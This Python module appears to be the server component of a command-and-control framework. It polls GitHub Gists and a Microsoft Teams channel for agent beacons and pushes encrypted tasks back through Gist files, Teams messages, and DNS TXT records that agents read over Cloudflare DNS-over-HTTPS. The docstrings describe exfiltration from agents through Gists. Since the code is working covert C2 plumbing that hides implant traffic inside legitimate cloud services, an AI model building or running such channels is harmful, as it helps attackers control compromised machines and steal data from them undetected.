"""
Background task: polls GitHub Gist (primary channel) every N seconds,
processes agent beacons, and writes pending task responses.

DoH command delivery (C2 → Agent):
  Server writes TXT record cmd.{agent_id}.khaotic.fr via IONOS DNS API.
  Agent queries Cloudflare DoH and reads it.
  Exfil direction (Agent → C2) uses GitHub Gist — DoH can't intercept queries
  without being the authoritative NS.
"""
import asyncio
import base64
import json
import logging
from typing import Optional

import httpx
from sqlalchemy.orm import Session as DBSession

from datetime import datetime, timezone

from models.agent import Agent, Base
from models.log import Log
from services.agent_manager import manager as agent_manager
import services.dns_server as _dns  # shared dns_pending_tasks dict

logger = logging.getLogger("channel_reader")

POLL_INTERVAL = 15  # seconds

# GitHub Gist channel

class GistChannel:
    """
    GitHub Gist poller.
    gist_out: agents upload beacons here  (file: {agent_id}_1x.bin)
    gist_cmd: server writes tasks here    (file: {agent_id}_0x.bin)
    """

    def __init__(self, token: str, gist_out_id: str, gist_cmd_id: str):
        self.token       = token
        self.gist_out_id = gist_out_id
        self.gist_cmd_id = gist_cmd_id
        self._headers    = {
            "Authorization":        f"token {token}",
            "Accept":               "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
            "User-Agent":           "Mozilla/5.0 (compatible; legitc2-server/1.0)",
        }

    async def _get_gist(self, gist_id: str) -> Optional[dict]:
        url = f"https://api.github.com/gists/{gist_id}"
        async with httpx.AsyncClient(timeout=30) as client:
            try:
                r = await client.get(url, headers=self._headers)
                if r.status_code == 200:
                    return r.json()
            except Exception as e:
                logger.warning("gist GET failed: %s", e)
        return None

    async def _patch_gist(self, gist_id: str, filename: str, content: str) -> bool:
        url  = f"https://api.github.com/gists/{gist_id}"
        body = {"files": {filename: {"content": content}}}
        async with httpx.AsyncClient(timeout=30) as client:
            try:
                r = await client.patch(url, headers=self._headers, json=body)
                return r.status_code in (200, 201)
            except Exception as e:
                logger.warning("gist PATCH failed: %s", e)
        return False

    async def read_all_beacons(self) -> dict[str, str]:
        """Return {agent_id: b64_packet} for every _1x.bin file in gist_out."""
        gist = await self._get_gist(self.gist_out_id)
        if not gist:
            return {}
        result = {}
        for fname, fdata in gist.get("files", {}).items():
            if fname.endswith("_1x.bin"):
                agent_id = fname[:-7]  # strip _1x.bin
                content  = (fdata.get("content") or "").strip()
                if content and content != "null":
                    result[agent_id] = content
        return result

    async def write_task(self, agent_id: str, b64_task: str) -> bool:
        filename = f"{agent_id}_0x.bin"
        return await self._patch_gist(self.gist_cmd_id, filename, b64_task)

    async def clear_beacon(self, agent_id: str) -> bool:
        filename = f"{agent_id}_1x.bin"
        return await self._patch_gist(self.gist_out_id, filename, "null")

# IONOS DNS channel — writes TXT records for DoH command delivery

class IonosDnsChannel:
    """
    IONOS DNS API v1 — manages TXT records for the DoH fallback channel.

    C2 → Agent flow:
      write_cmd_record(agent_id, b64_task)
        → creates/updates TXT record: cmd.{agent_id}.{domain} = b64_task
        → agent queries Cloudflare DoH and reads it

    clear_cmd_record(agent_id)
        → deletes the TXT record after the agent has acknowledged the task

    API key format (IONOS developer console): "{prefix}.{secret}"
    """

    BASE_URL = "https://api.hosting.ionos.com/dns/v1"

    def __init__(self, api_key: str, domain: str):
        self.api_key  = api_key
        self.domain   = domain.rstrip(".")
        self._headers = {
            "X-API-Key":      api_key,
            "Accept":         "application/json",
            "Content-Type":   "application/json",
        }
        self._zone_id: Optional[str] = None

    async def _get_zone_id(self) -> Optional[str]:
        if self._zone_id:
            return self._zone_id
        url = f"{self.BASE_URL}/zones"
        async with httpx.AsyncClient(timeout=15) as client:
            try:
                r = await client.get(url, headers=self._headers)
                if r.status_code != 200:
                    logger.warning("ionos GET /zones → %d", r.status_code)
                    return None
                for zone in r.json():
                    if zone.get("name", "").rstrip(".") == self.domain:
                        self._zone_id = zone["id"]
                        logger.info("ionos zone_id for %s = %s", self.domain, self._zone_id)
                        return self._zone_id
                logger.warning("ionos: zone %s not found", self.domain)
            except Exception as e:
                logger.warning("ionos _get_zone_id: %s", e)
        return None

    async def _find_record(self, name: str) -> Optional[str]:
        """Return record ID for an existing TXT record with given name, or None."""
        zone_id = await self._get_zone_id()
        if not zone_id:
            return None
        url = f"{self.BASE_URL}/zones/{zone_id}"
        async with httpx.AsyncClient(timeout=15) as client:
            try:
                r = await client.get(url, headers=self._headers)
                if r.status_code != 200:
                    return None
                for rec in r.json().get("records", []):
                    if rec.get("type") == "TXT" and rec.get("name", "").rstrip(".") == name.rstrip("."):
                        return rec["id"]
            except Exception as e:
                logger.warning("ionos _find_record: %s", e)
        return None

    async def write_cmd_record(self, agent_id: str, b64_task: str) -> bool:
        """Create or update TXT record cmd.{agent_id}.{domain} = b64_task (TTL 60s)."""
        zone_id = await self._get_zone_id()
        if not zone_id:
            return False

        fqdn        = f"cmd.{agent_id}.{self.domain}"
        existing_id = await self._find_record(fqdn)

        async with httpx.AsyncClient(timeout=15) as client:
            try:
                if existing_id:
                    # PUT updates a single record
                    url  = f"{self.BASE_URL}/zones/{zone_id}/records/{existing_id}"
                    body = {
                        "name":     fqdn,
                        "type":     "TXT",
                        "content":  b64_task,
                        "ttl":      60,
                        "prio":     0,
                        "disabled": False,
                    }
                    r = await client.put(url, headers=self._headers, json=body)
                else:
                    # POST creates records (array)
                    url  = f"{self.BASE_URL}/zones/{zone_id}/records"
                    body = [{
                        "name":     fqdn,
                        "type":     "TXT",
                        "content":  b64_task,
                        "ttl":      60,
                        "prio":     0,
                        "disabled": False,
                    }]
                    r = await client.post(url, headers=self._headers, json=body)

                ok = r.status_code in (200, 201)
                if not ok:
                    logger.warning("ionos write TXT %s → %d: %s", fqdn, r.status_code, r.text[:200])
                else:
                    logger.info("ionos TXT written: %s", fqdn)
                return ok
            except Exception as e:
                logger.warning("ionos write_cmd_record: %s", e)
        return False

    async def clear_cmd_record(self, agent_id: str) -> bool:
        """Delete cmd TXT record once agent has acknowledged the task."""
        zone_id = await self._get_zone_id()
        if not zone_id:
            return False

        fqdn        = f"cmd.{agent_id}.{self.domain}"
        existing_id = await self._find_record(fqdn)
        if not existing_id:
            return True  # already gone — fine

        url = f"{self.BASE_URL}/zones/{zone_id}/records/{existing_id}"
        async with httpx.AsyncClient(timeout=15) as client:
            try:
                r = await client.delete(url, headers=self._headers)
                ok = r.status_code in (200, 204)
                if ok:
                    logger.info("ionos TXT cleared: %s", fqdn)
                return ok
            except Exception as e:
                logger.warning("ionos clear_cmd_record: %s", e)
        return False


# Microsoft Teams channel (Graph API, app-only auth)

class TeamsChannel:
    """
    Bidirectional Teams channel via Microsoft Graph API.

    Agent→Server  :  agent posts  "LC2:{agent_id}:{b64_beacon}"
    Server→Agent  :  server posts "TASK:{agent_id}:{b64_task}"

    Uses client_credentials flow — requires ChannelMessage.Read.All
    and ChannelMessage.Send application permissions in Azure AD.

    Deduplication: in-memory set of processed message IDs.
    On first poll, existing messages are marked seen without processing
    so a server restart never replays stale beacons.
    """

    GRAPH = "https://graph.microsoft.com/v1.0"

    def __init__(self, tenant_id: str, client_id: str, client_secret: str,
                 team_id: str, channel_id: str):
        self.tenant_id     = tenant_id
        self.client_id     = client_id
        self.client_secret = client_secret
        self.team_id       = team_id
        self.channel_id    = channel_id
        self._token:      Optional[str]  = None
        self._token_exp:  float          = 0.0
        self._seen_ids:   set[str]       = set()
        self._primed      = False          # True after first poll drains existing msgs

    async def _get_token(self) -> Optional[str]:
        """Return cached OAuth2 token, refreshing if expired (with 60s buffer)."""
        import time
        if self._token and time.time() < self._token_exp - 60:
            return self._token

        url  = f"https://login.microsoftonline.com/{self.tenant_id}/oauth2/v2.0/token"
        body = {
            "grant_type":    "client_credentials",
            "client_id":     self.client_id,
            "client_secret": self.client_secret,
            "scope":         "https://graph.microsoft.com/.default",
        }
        async with httpx.AsyncClient(timeout=30) as client:
            try:
                r = await client.post(url, data=body)
                if r.status_code != 200:
                    logger.warning("teams token: %d %s", r.status_code, r.text[:200])
                    return None
                data = r.json()
                self._token     = data.get("access_token")
                self._token_exp = time.time() + data.get("expires_in", 3600)
                return self._token
            except Exception as e:
                logger.warning("teams _get_token: %s", e)
        return None

    async def _graph_get(self, path: str) -> Optional[dict]:
        token = await self._get_token()
        if not token:
            return None
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept":        "application/json",
        }
        async with httpx.AsyncClient(timeout=30) as client:
            try:
                r = await client.get(f"{self.GRAPH}{path}", headers=headers)
                if r.status_code == 200:
                    return r.json()
                logger.warning("teams GET %s → %d", path, r.status_code)
            except Exception as e:
                logger.warning("teams _graph_get: %s", e)
        return None

    async def _graph_post(self, path: str, body: dict) -> bool:
        token = await self._get_token()
        if not token:
            return False
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type":  "application/json",
        }
        async with httpx.AsyncClient(timeout=30) as client:
            try:
                r = await client.post(f"{self.GRAPH}{path}", headers=headers, json=body)
                ok = r.status_code in (200, 201)
                if not ok:
                    logger.warning("teams POST %s → %d %s", path, r.status_code, r.text[:200])
                return ok
            except Exception as e:
                logger.warning("teams _graph_post: %s", e)
        return False

    async def read_beacons(self) -> dict[str, str]:
        """
        Fetch recent channel messages, extract LC2 beacons not yet processed.
        First call marks all existing messages as seen without processing them.
        Returns {agent_id: b64_packet}.
        """
        path = (
            f"/teams/{self.team_id}/channels/{self.channel_id}/messages"
            "?$top=20&$orderby=createdDateTime+desc"
        )
        data = await self._graph_get(path)
        if not data:
            return {}

        messages  = data.get("value", [])
        result    = {}

        for msg in reversed(messages):   # oldest first so we process in order
            msg_id  = msg.get("id", "")
            if not msg_id or msg_id in self._seen_ids:
                continue
            self._seen_ids.add(msg_id)

            if not self._primed:
                # First poll: drain without processing
                continue

            # Extract plain-text body
            body_content = (msg.get("body") or {}).get("content", "")
            # Strip basic HTML tags Teams sometimes wraps content in
            import re as _re
            text = _re.sub(r"<[^>]+>", "", body_content).strip()

            if not text.startswith("LC2:"):
                continue

            parts = text.split(":", 2)   # ["LC2", agent_id, b64]
            if len(parts) != 3:
                continue
            _, agent_id, b64 = parts
            if agent_id and b64:
                result[agent_id] = b64
                logger.info("teams beacon from %s (msg %s)", agent_id, msg_id)

        if not self._primed:
            self._primed = True
            logger.info("teams channel primed — %d existing messages marked seen",
                        len(messages))

        return result

    async def write_task(self, agent_id: str, b64_task: str) -> bool:
        """Post TASK message to Teams channel (agent reads it via Graph poll)."""
        path = f"/teams/{self.team_id}/channels/{self.channel_id}/messages"
        body = {
            "body": {
                "contentType": "text",
                "content": f"TASK:{agent_id}:{b64_task}",
            }
        }
        return await self._graph_post(path, body)

# Channel orchestrator

class ChannelReader:
    def __init__(self, config: dict, db_session_factory):
        self.config     = config
        self.db_factory = db_session_factory
        self._gist:  Optional[GistChannel]     = None
        self._ionos: Optional[IonosDnsChannel]  = None
        self._teams: Optional[TeamsChannel]     = None
        self._running = False

    def _init_channels(self) -> None:
        channels = self.config.get("channels", {})

        # GitHub Gist
        gh = channels.get("github", {})
        if gh.get("token") and gh.get("gist_out") and gh.get("gist_cmd"):
            self._gist = GistChannel(gh["token"], gh["gist_out"], gh["gist_cmd"])
            logger.info("channel: GitHub Gist enabled")

        # IONOS DNS
        doh = channels.get("doh", {})
        api_key = doh.get("ionos_api_key", "")
        domain  = doh.get("domain", "")
        if api_key and domain and "." in api_key:  # valid key has prefix.secret
            self._ionos = IonosDnsChannel(api_key, domain)
            logger.info("channel: IONOS DNS enabled (domain=%s)", domain)

        # Microsoft Teams
        tm = channels.get("teams", {})
        _required = ("tenant_id", "client_id", "client_secret", "team_id", "channel_id")
        if all(tm.get(k, "").strip() and tm.get(k) != f"TEAMS_{k.upper()}"
               for k in _required):
            self._teams = TeamsChannel(
                tm["tenant_id"], tm["client_id"], tm["client_secret"],
                tm["team_id"],   tm["channel_id"],
            )
            logger.info("channel: Microsoft Teams enabled (team=%s)", tm["team_id"])

    async def _write_task_all_channels(self, agent_id: str, b64_task: str) -> None:
        """Push task to every available channel in parallel."""
        # Always populate DNS pending_tasks so DoH fallback works
        _dns.dns_pending_tasks[agent_id] = b64_task

        coros = []
        if self._gist:
            coros.append(self._gist.write_task(agent_id, b64_task))
        if self._ionos:
            coros.append(self._ionos.write_cmd_record(agent_id, b64_task))
        if self._teams:
            coros.append(self._teams.write_task(agent_id, b64_task))
        if coros:
            await asyncio.gather(*coros, return_exceptions=True)

    async def _process_packet(self, agent_id: str, b64_pkt: str, db: DBSession) -> None:
        """Route a raw b64 packet: handshake vs encrypted beacon."""
        try:
            raw     = base64.b64decode(b64_pkt)
            payload = json.loads(raw.decode())
            pkt_type = payload.get("t", "")
        except Exception:
            pkt_type = "encrypted"

        if pkt_type == "h":
            resp = agent_manager.process_handshake(b64_pkt, db)
            if resp:
                await self._write_task_all_channels(agent_id, resp)
            return

        # Encrypted beacon
        agent_manager.process_beacon(agent_id, b64_pkt, db)

        # Dispatch pending task or noop
        task_pkt = agent_manager.get_pending_task_packet(agent_id, db)
        if task_pkt:
            await self._write_task_all_channels(agent_id, task_pkt)
        else:
            noop_pkt = _build_noop_packet(agent_id, db)
            if noop_pkt:
                await self._write_task_all_channels(agent_id, noop_pkt)

    async def poll_once(self) -> None:
        # Collect beacons per channel, tracking source for post-process cleanup
        gist_beacons:  dict[str, str] = {}
        teams_beacons: dict[str, str] = {}

        if self._gist:
            gist_beacons = await self._gist.read_all_beacons()
        if self._teams:
            teams_beacons = await self._teams.read_beacons()

        # Merge: Gist takes priority over Teams for the same agent_id
        all_beacons = {**teams_beacons, **gist_beacons}
        if not all_beacons:
            return

        db: DBSession = self.db_factory()
        try:
            for agent_id, b64_pkt in all_beacons.items():
                try:
                    await self._process_packet(agent_id, b64_pkt, db)
                    if agent_id in gist_beacons and self._gist:
                        await self._gist.clear_beacon(agent_id)
                except Exception as e:
                    logger.error("error processing beacon for %s: %s", agent_id, e)
        finally:
            db.close()

    async def run(self) -> None:
        self._init_channels()
        self._running = True
        logger.info("channel_reader started (interval=%ds)", POLL_INTERVAL)
        while self._running:
            try:
                await self.poll_once()
            except Exception as e:
                logger.error("poll_once error: %s", e)
            await asyncio.sleep(POLL_INTERVAL)

    def stop(self) -> None:
        self._running = False


def _build_noop_packet(agent_id: str, db: DBSession) -> Optional[str]:
    from services.agent_manager import manager
    session = manager.get_session(agent_id)
    if session is None or not session.crypto.ready:
        return None
    return session.crypto.seal_json({"t": "n"})
